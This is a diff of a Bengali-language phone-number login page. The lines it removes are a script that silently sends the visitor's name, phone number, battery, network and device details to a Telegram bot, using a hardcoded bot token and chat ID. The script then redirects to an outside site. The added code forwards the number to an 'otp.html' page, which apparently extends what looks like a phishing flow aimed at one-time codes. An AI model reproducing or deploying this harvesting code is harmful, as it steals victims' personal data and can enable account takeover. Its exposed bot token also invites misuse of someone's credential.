@@ -10,18 +10,18 @@
     <style>
         .inputBox {
             position: relative;
-            margin-bottom: -30px; /* Input fields মধ্যে জায়গা বাড়ানো */
+            margin-bottom: -30px;
         }
 
         .inputBox input[type="submit"] {
-            margin-top: 40px; /* লগইন বাটনের উপরের জায়গা বাড়ানো */
+            margin-top: 40px;
         }
 
-/* Disable button style */
-input[type="submit"]:disabled {
-    background-color: #ccc;
-    cursor: not-allowed;
-}
+        input[type="submit"]:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
         .warning {
             color: red;
             display: none;
@@ -66,10 +66,6 @@ input[type="submit"]:disabled {
     <section>
         <div class="leaves">
             <!-- Leaves images here -->
-            		<div class="leaves">
-
-
-			</div>
         </div>
         <img src="bg.jpg" class="bg">
         <img src="girl.png" class="girl">
@@ -81,101 +77,35 @@ input[type="submit"]:disabled {
             </div>
             <div class="inputBox">
                 <input type="tel" placeholder="Number" id="phoneNumber">
-                <p id="warning" class="warning">আপনার ফোন নাম্বারটি সঠিক নয়.!  ⚠️🚫</p>
+                <p id="warning" class="warning">আপনার ফোন নাম্বারটি সঠিক নয়! ⚠️🚫</p>
             </div>
             <div class="inputBox">
                 <input type="submit" value="Login" id="btn">
                 <p id="success-message" class="success-message">লগিন সফল হয়েছে!</p>
-                
-            
-
             </div>
         </div>
     </section>
 
-    </div>
     <script>
         document.getElementById('btn').addEventListener('click', function(event) {
-    event.preventDefault(); // Prevent the form from submitting the default way
+            event.preventDefault(); // Prevent the form from submitting the default way
 
-    var username = document.getElementById('username').value; // Get the value of username
-    var phoneNumber = document.getElementById('phoneNumber').value; // Get the value of phone number
-    var warning = document.getElementById('warning');
-    var successMessage = document.getElementById('success-message');
-    var btn = document.getElementById('btn');
+            var phoneNumber = document.getElementById('phoneNumber').value; // Get the phone number value
+            var warning = document.getElementById('warning');
+            var btn = document.getElementById('btn');
 
-    // Phone number validation
-    if (phoneNumber.length !== 11) {
-        warning.style.display = 'block';
-        warning.style.animation = 'shake 0.5s'; // Trigger shake animation
-        return; // Prevent further execution if phone number is invalid
-    } else {
-        warning.style.display = 'none';
-    }
+            // Validate phone number
+            if (phoneNumber.length !== 11) {
+                warning.style.display = 'block';
+                warning.style.animation = 'shake 0.5s';
+                return;
+            } else {
+                warning.style.display = 'none';
+            }
 
-    // Disable the button to prevent multiple clicks
-    btn.disabled = true;
-
-    // Collecting network and battery information
-    var networkInfo = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
-    if (networkInfo === 'wifi' || networkInfo === '4g') {
-        networkInfo = 'Wi-Fi'; // Override to 'Wi-Fi' if 4G is detected but Wi-Fi is being used
-    }
-
-    navigator.getBattery().then(function(battery) {
-        var batteryInfo = {
-            level: battery.level * 100,
-            charging: battery.charging ? 'Yes' : 'No'
-        };
-
-        var deviceName = navigator.userAgent; // Device name or user agent string
-
-        var message = `Nᴇᴡ ɴᴜᴍʙᴇʀ ғᴏᴜɴᴅ
-        
-┌─────────────────⭓
-├⪦ ∷ Nᴀᴍᴇ: ${username}\n├⪦ ∷ Nᴜᴍʙᴇʀ: ${phoneNumber}\n├⪦ ∷ Nᴇᴛᴡᴏʀᴋ: ${networkInfo}\n├⪦ ∷ Bᴀᴛᴛᴇʀʏ Lᴇᴠᴇʟ: ${batteryInfo.level}%\n├⪦ ∷ Cʜᴀʀɢɪɴɢ: ${batteryInfo.charging}
-└─────────────────⧕
-\n\n✦────────────────────────✦
-${deviceName}
-✦────────────────────────✦`;
-
-        // Telegram bot API URL
-        var token = '6696317970:AAH1NZPjLjwD_8Jav73izvSqtDKL9qGpMBE';
-        var chatId = '5624278091';
-        var url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-        var data = {
-            chat_id: chatId,
-            text: message
-        };
-
-        fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Success:', data);
-            // Show success message and redirect after a short delay
-            successMessage.style.display = 'block';
-            setTimeout(function() {
-                window.location.href = 'https://yttrium022.github.io/Sms-2nd-p/'; // Replace with your desired page
-            }, 1000); // Redirect after 1 second
-        })
-        .catch((error) => {
-            console.error('Error:', error);
-            btn.disabled = false; // Re-enable button if there's an error
+            // Redirect to OTP page with phone number as a URL parameter
+            window.location.href = 'otp.html?phone=' + encodeURIComponent(phoneNumber);
         });
-    });
-});
-        
-        warning.style.animation = 'none'; // Reset animation
-setTimeout(function() {
-    warning.style.animation = ''; // Apply animation again
-}, 10);
     </script>
 </body>
 </html>
